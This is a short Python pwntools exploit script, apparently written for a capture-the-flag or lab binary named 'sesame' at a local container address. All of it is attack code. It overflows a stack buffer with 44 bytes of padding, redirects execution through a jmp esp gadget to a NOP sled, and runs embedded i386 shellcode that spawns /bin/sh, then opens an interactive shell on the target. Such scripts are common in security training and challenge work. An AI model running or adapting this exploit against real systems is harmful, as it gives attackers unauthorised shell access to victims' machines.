#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sesame')
context.arch = "i386"

host = args.HOST or '172.17.0.3'
port = int(args.PORT or 3141)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
c
'''.format(**locals())

# -- Exploit goes here --
RIP_OFFSET = 44
JMPESP_ADDR = 0x080491e7
SHELLCODE = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

io = start()

payload = b""
payload += b"A" * RIP_OFFSET
payload += p32(JMPESP_ADDR)
payload += b"\x90" * 12
payload += SHELLCODE

io.sendlineafter(b"Input: ", payload)

io.interactive()





